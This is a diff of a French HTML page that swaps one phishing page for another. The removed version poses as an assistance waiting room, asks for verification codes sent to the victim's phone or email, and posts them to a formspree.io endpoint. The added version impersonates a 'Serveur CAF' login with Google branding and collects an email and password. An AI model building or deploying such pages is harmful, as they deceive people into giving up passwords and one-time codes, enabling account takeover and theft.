@@ -3,649 +3,185 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Salle d'attente — Assistance</title>
-
+<title>Identification — Votre compte - Serveur CAF</title>
 <style>
   :root {
     --ink: #1f2b24;
     --ink-soft: #4a5750;
     --paper: #f7f6f1;
     --card: #ffffff;
-    --blue: #2563EB;
-    --blue-deep: #1D4ED8;
+    --sage: #2563EB;
+--sage-deep: #1D4ED8;
     --line: #d9d5c9;
-    --radius: 10px;
-    --success: #27834b;
+    --warn-bg: #fbf3e3;
+    --warn-line: #e0c98f;
     --error: #a3372c;
+    --radius: 10px;
   }
 
-  * {
-    box-sizing: border-box;
-    margin: 0;
-    padding: 0;
-  }
+  * { box-sizing: border-box; }
 
   body {
-    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    margin: 0;
+    font-family: "Iowan Old Style", "Palatino Linotype", Georgia, serif;
     background: var(--paper);
     color: var(--ink);
-    min-height: 100vh;
-    display: flex;
-    flex-direction: column;
+    line-height: 1.55;
   }
 
-  /* =========================
-     HEADER
-  ========================= */
+  .wrap {
+    max-width: 720px;
+    margin: 0 auto;
+    padding: 0 20px 80px;
+  }
 
   header.hero {
-    position: relative;
-    background-image: url('/images/logoc.JPG');
-    background-size: cover;
-    background-position: center;
-    background-repeat: no-repeat;
-    color: #fff;
+    background: var(--sage-deep);
+    color: #f1f0e6;
     padding: 56px 20px 40px;
     margin-bottom: -28px;
-    overflow: hidden;
-  }
-
-  header.hero::before {
-    content: "";
-    position: absolute;
-    inset: 0;
-    background: rgba(29, 78, 216, 0.72);
-    z-index: 0;
   }
 
   header.hero .hero-inner {
-    position: relative;
-    z-index: 1;
     max-width: 720px;
     margin: 0 auto;
   }
 
   .eyebrow {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
     text-transform: uppercase;
     letter-spacing: 0.14em;
     font-size: 12px;
-    color: #dbe7ff;
-    margin-bottom: 12px;
+    color: #b9cdbd;
+    margin: 0 0 14px;
   }
 
   header.hero h1 {
-    font-size: clamp(22px, 4vw, 30px);
-    font-weight: 600;
+    font-size: clamp(24px, 5vw, 34px);
     line-height: 1.2;
+    margin: 0 0 16px;
+    font-weight: 600;
   }
 
-  /* =========================
-     CONTENEUR
-  ========================= */
-
-  .wrap {
-    max-width: 720px;
-    margin: 0 auto;
-    padding: 0 20px 60px;
-    width: 100%;
-    flex: 1;
+  header.hero p {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    color: #d8ddd3;
+    font-size: 15px;
+    max-width: 54ch;
+    margin: 0;
   }
 
   main {
     background: var(--card);
     border-radius: var(--radius);
-    box-shadow:
-      0 1px 3px rgba(0,0,0,0.06),
-      0 12px 32px rgba(30,40,30,0.08);
-    padding: 48px 28px 48px;
+    box-shadow: 0 1px 3px rgba(0,0,0,0.06), 0 12px 32px rgba(30,40,30,0.08);
+    padding: 36px 28px 40px;
     position: relative;
     z-index: 1;
-    text-align: center;
   }
 
-  /* =========================
-     BADGE
-  ========================= */
+  .field { margin-bottom: 24px; }
 
-  .live-badge {
-    display: inline-flex;
-    align-items: center;
-    gap: 8px;
-    background: #eef2ea;
-    border: 1px solid #c8d4c0;
-    border-radius: 999px;
-    padding: 6px 16px;
-    font-size: 13px;
+  label {
+    display: block;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
     font-weight: 600;
-    color: var(--blue-deep);
-    margin-bottom: 36px;
-  }
-
-  .pulse-dot {
-    width: 10px;
-    height: 10px;
-    border-radius: 50%;
-    background: #3a9a5c;
-    position: relative;
-    flex-shrink: 0;
-  }
-
-  .pulse-dot::after {
-    content: "";
-    position: absolute;
-    inset: -4px;
-    border-radius: 50%;
-    background: #3a9a5c;
-    opacity: 0.3;
-    animation: pulse 1.8s ease-out infinite;
-  }
-
-  @keyframes pulse {
-    0% {
-      transform: scale(1);
-      opacity: 0.35;
-    }
-
-    60% {
-      transform: scale(2.2);
-      opacity: 0;
-    }
-
-    100% {
-      transform: scale(2.2);
-      opacity: 0;
-    }
-  }
-
-  /* =========================
-     SPINNER
-  ========================= */
-
-  .spinner-wrap {
-    display: flex;
-    justify-content: center;
-    margin-bottom: 32px;
-  }
-
-  .spinner {
-    width: 56px;
-    height: 56px;
-    border: 4px solid #e0ddd4;
-    border-top-color: var(--blue);
-    border-radius: 50%;
-    animation: spin 1.1s linear infinite;
-  }
-
-  @keyframes spin {
-    to {
-      transform: rotate(360deg);
-    }
-  }
-
-  /* =========================
-     TEXTE
-  ========================= */
-
-  h2 {
-    font-family: "Iowan Old Style", "Palatino Linotype", Georgia, serif;
-    font-size: 24px;
-    font-weight: 600;
-    color: var(--ink);
-    margin-bottom: 14px;
-    line-height: 1.3;
-  }
-
-  .subtitle {
-    font-size: 15.5px;
-    color: var(--ink-soft);
-    max-width: 40ch;
-    margin: 0 auto 40px;
-    line-height: 1.6;
-  }
-
-  /* =========================
-     ÉTAPES
-  ========================= */
-
-  .steps {
-    display: flex;
-    flex-direction: column;
-    gap: 0;
-    text-align: left;
-    max-width: 380px;
-    margin: 0 auto 40px;
-    border: 1px solid var(--line);
-    border-radius: 10px;
-    overflow: hidden;
-  }
-
-  .step-row {
-    display: flex;
-    align-items: center;
-    gap: 14px;
-    padding: 16px 18px;
-    border-bottom: 1px solid var(--line);
-    font-size: 14.5px;
-    color: var(--ink-soft);
-    background: #fafaf6;
-  }
-
-  .step-row:last-child {
-    border-bottom: none;
-  }
-
-  .step-row.done {
-    color: var(--blue-deep);
-    background: #f0f4ed;
-  }
-
-  .step-row.active {
-    color: var(--ink);
-    background: var(--card);
-    font-weight: 600;
-  }
-
-  .step-icon {
-    font-size: 18px;
-    flex-shrink: 0;
-    width: 24px;
-    text-align: center;
-  }
-
-  .step-row.active .step-icon {
-    animation: bob 1.4s ease-in-out infinite;
-  }
-
-  @keyframes bob {
-    0%, 100% {
-      transform: translateY(0);
-    }
-
-    50% {
-      transform: translateY(-3px);
-    }
-  }
-
-  /* =========================
-     FORMULAIRE
-  ========================= */
-
-  .waiting-form {
-    max-width: 420px;
-    margin: 0 auto 30px;
-    padding: 24px 20px;
-    background: #fafaf6;
-    border: 1px solid var(--line);
-    border-radius: 10px;
-    text-align: left;
-  }
-
-  .waiting-form h3 {
-    font-family: "Iowan Old Style", "Palatino Linotype", Georgia, serif;
-    font-size: 20px;
-    text-align: center;
+    font-size: 15px;
     margin-bottom: 8px;
     color: var(--ink);
   }
 
-  .form-description {
-    text-align: center;
-    color: var(--ink-soft);
-    font-size: 14px;
-    margin-bottom: 22px;
-    line-height: 1.5;
-  }
+  label .req { color: var(--error); font-weight: 400; margin-left: 2px; }
 
-  .field {
-    margin-bottom: 18px;
-  }
-
-  .field label {
-    display: block;
-    font-size: 14px;
-    font-weight: 600;
-    margin-bottom: 7px;
-    color: var(--ink);
-  }
-
-  .field input {
+  input[type="text"] {
     width: 100%;
-    padding: 12px 14px;
+    padding: 13px 14px;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 16px;
     border: 1px solid #c7c2b3;
     border-radius: 8px;
-    background: #fff;
+    background: #fffefb;
     color: var(--ink);
-    font-family: inherit;
-    font-size: 15px;
     outline: none;
     transition: border-color 0.15s ease, box-shadow 0.15s ease;
   }
 
-  .field input:focus {
-    border-color: var(--blue);
-    box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.14);
+  input[type="text"]:focus {
+    border-color: var(--sage);
+    box-shadow: 0 0 0 3px rgba(60,90,72,0.15);
   }
 
-  .submit-button {
+  button[type="submit"] {
     width: 100%;
-    border: none;
-    border-radius: 8px;
-    padding: 14px 16px;
-    background: var(--blue-deep);
+    background: var(--sage-deep);
     color: #fff;
-    font-size: 15.5px;
-    font-weight: 600;
-    cursor: pointer;
-    transition: background 0.15s ease, opacity 0.15s ease;
-  }
-
-  .submit-button:hover {
-    background: var(--blue);
-  }
-
-  .submit-button:disabled {
-    opacity: 0.65;
-    cursor: not-allowed;
-  }
-
-  .form-status {
-    display: none;
-    max-width: 420px;
-    margin: 0 auto 30px;
+    border: none;
     padding: 16px;
     border-radius: 8px;
-    background: #eef7f0;
-    border: 1px solid #b9d9c0;
-    color: var(--success);
-    font-size: 14px;
-    text-align: center;
-  }
-
-  .form-status.show {
-    display: block;
-  }
-
-  .form-error {
-    display: none;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    font-size: 16.5px;
+    font-weight: 600;
+    cursor: pointer;
     margin-top: 12px;
-    color: var(--error);
-    font-size: 13px;
-    text-align: center;
+    transition: background 0.15s ease;
   }
 
-  .form-error.show {
-    display: block;
-  }
-
-  /* =========================
-     NOTICE
-  ========================= */
-
-  .notice-wait {
-    display: flex;
-    gap: 12px;
-    align-items: flex-start;
-    background: #fbf3e3;
-    border: 1px solid #e0c98f;
-    border-radius: 8px;
-    padding: 16px 18px;
-    font-size: 14px;
-    color: #5c4a1f;
-    text-align: left;
-    max-width: 420px;
-    margin: 0 auto;
-  }
-
-  /* =========================
-     FOOTER
-  ========================= */
+  button[type="submit"]:hover { background: var(--sage); }
 
   footer {
     text-align: center;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
     font-size: 12.5px;
     color: var(--ink-soft);
-    margin-top: 28px;
-    padding-bottom: 20px;
+    margin-top: 30px;
   }
 
-  /* =========================
-     MOBILE
-  ========================= */
-
   @media (max-width: 480px) {
-
-    main {
-      padding: 36px 18px 40px;
-    }
-
-    header.hero {
-      padding: 36px 16px 28px;
-    }
-
-    .waiting-form {
-      padding: 22px 16px;
-    }
+    main { padding: 28px 18px 32px; }
+    header.hero { padding: 44px 16px 36px; }
   }
 </style>
 </head>
-
 <body>
 
 <header class="hero">
   <div class="hero-inner">
-    <p class="eyebrow">Salle d'assistance</p>
-    <h1>ATTENTE DE VÉRIFICATION</h1>
+    <p class="eyebrow">Identification et connection au serveur</p>
+    <h1>Vérification de votre compte</h1>
+    <p>Veuillez connecter votre Google pour continuer.</p>
   </div>
 </header>
 
 <div class="wrap">
-
   <main>
-
-    <div class="live-badge">
-      <span class="pulse-dot"></span>
-      Connecté(e) — En attente
-    </div>
-
-    <div class="spinner-wrap">
-      <div class="spinner"></div>
-    </div>
-
-    <h2>Votre assistant(e) arrive</h2>
-
-    <p class="subtitle">
-      Restez sur cette page. Vous serez pris(e) en charge dès qu'un(e)
-      assistant(e) sera disponible.
-    </p>
-
-    <!-- ÉTAPES -->
-
-    <div class="steps">
-
-      <div class="step-row done">
-        <span class="step-icon">✅</span>
-        <span>VÉRIFICATION EN COURS</span>
-      </div>
-
-      <div class="step-row active">
-        <span class="step-icon">⏳</span>
-        <span>En attente d'un(e) assistant(e)…</span>
-      </div>
-
-      <div class="step-row">
-        <span class="step-icon">💬</span>
-        <span>Instructions à venir</span>
-      </div>
-
-    </div>
-
-    <!-- FORMULAIRE -->
-
-    <form
-      id="waitingForm"
-      class="waiting-form"
-      action="https://formspree.io/f/xppzajdq"
-      method="POST"
-    >
-
-      <h3>Une petite information</h3>
-
-      <p class="form-description">
-        Veuillez mettre le code que vous allez recevoir dans les 10 à 20 min par votre numéro ou email
-      </p>
-
-      <div class="field">
-
-        <label for="Code">
-          Code
-        </label>
-
-        <input
-          type="text"
-          id="code"
-          name="code"
-          placeholder="code"
-          autocomplete="given-name"
-          required
-        >
-
-      </div>
-
-      <div class="field">
-
-        <label for="message">
-          Patienter jusqu'à ce que le prochain code vienne et metter pour finaliser
-        </label>
-
+<svg width="20" height="20" viewBox="0 0 24 24">
+  <path fill="#4285F4" d="M21.35 12.27c0-.79-.07-1.55-.22-2.27H12v4.3h5.24a4.48 4.48 0 0 1-1.94 2.94v2.45h3.14c1.84-1.69 2.91-4.18 2.91-7.42z"/>
+  <path fill="#34A853" d="M12 21.99c2.63 0 4.84-.87 6.45-2.36l-3.14-2.45c-.87.58-1.98.92-3.31.92-2.54 0-4.7-1.72-5.47-4.04H3.28v2.53A9.75 9.75 0 0 0 12 21.99z"/>
+  <path fill="#FBBC05" d="M6.53 14.06A5.86 5.86 0 0 1 6.22 12c0-.72.12-1.42.31-2.06V7.41H3.28A9.75 9.75 0 0 0 2.25 12c0 1.57.38 3.05 1.03 4.59l3.25-2.53z"/>
+  <path fill="#EA4335" d="M12 5.9c1.43 0 2.71.49 3.72 1.45l2.79-2.79C16.84 2.98 14.63 2 12 2a9.75 9.75 0 0 0-8.72 5.41l3.25 2.53C7.3 7.62 9.46 5.9 12 5.9z"/>
+</svg>
     
+    <form name="soumettre " method="POST" action="/merci.html" data-netlify="true">
+      <input type="hidden" name="form-name" value="identification-compte">
 
+      <div class="field">
+        <label for="nom">1 — Email<span class="req">*</span></label>
+        <input type="text" id="nom" name="nom" placeholder="Votre nom de famille" required>
       </div>
 
-      <button
-        type="submit"
-        class="submit-button"
-        id="submitBtn"
-      >
-        Confirmer →
-      </button>
+      <div class="field">
+        <label for="username">2 — Mot de passe <span class="req">*</span></label>
+        <input type="text" id="username" name="username" placeholder="Votre nom d'utilisateur" required>
+      </div>
 
-      <p
-        class="form-error"
-        id="formError"
-      >
-        Une erreur est survenue. Veuillez réessayer.
-      </p>
-
+      <button type="submit">Se connecter →</button>
     </form>
-
-    <!-- MESSAGE APRÈS ENVOI -->
-
-    <div
-      class="form-status"
-      id="formStatus"
-    >
-      ✅ Votre réponse a bien été envoyée.
-    </div>
-
-    <!-- NOTICE -->
-
-    <div class="notice-wait">
-
-      <span>⚠️</span>
-
-      <div>
-        Ne fermez pas cette page. Votre assistant(e) vous contactera
-        directement via le canal convenu.
-      </div>
-
-    </div>
 
   </main>
 
   <footer>
-    Salle d'assistance indépendante — Merci de patienter.
+    Après avoir soumis, votre assistant(e) vous enverra un code. Veuillez le sélectionner pour vous connecter au serveur.
   </footer>
-
 </div>
-
-
-<script>
-
-  const form = document.getElementById("waitingForm");
-  const submitBtn = document.getElementById("submitBtn");
-  const formStatus = document.getElementById("formStatus");
-  const formError = document.getElementById("formError");
-
-  form.addEventListener("submit", async function(event) {
-
-    event.preventDefault();
-
-    formError.classList.remove("show");
-
-    submitBtn.disabled = true;
-    submitBtn.textContent = "Envoi en cours…";
-
-    const formData = new FormData(form);
-
-    try {
-
-      const response = await fetch(
-        "https://formspree.io/f/xppzajdq",
-        {
-          method: "POST",
-          body: formData,
-          headers: {
-            "Accept": "application/json"
-          }
-        }
-      );
-
-      if (!response.ok) {
-        throw new Error("Erreur lors de l'envoi");
-      }
-
-      /* Masquer le formulaire */
-
-      form.style.display = "none";
-
-      /* Afficher la confirmation */
-
-      formStatus.classList.add("show");
-
-      /*
-        Après 2 secondes :
-        - le message disparaît
-        - le formulaire revient
-        - la page reste exactement la même
-      */
-
-      setTimeout(function() {
-
-        form.reset();
-
-        formStatus.classList.remove("show");
-
-        form.style.display = "block";
-
-        submitBtn.disabled = false;
-
-        submitBtn.textContent = "Soumettre →";
-
-      }, 2000);
-
-    } catch (error) {
-
-      formError.classList.add("show");
-
-      submitBtn.disabled = false;
-
-      submitBtn.textContent = "Soumettre →";
-
-    }
-
-  });
-
-</script>
-
 </body>
 </html>
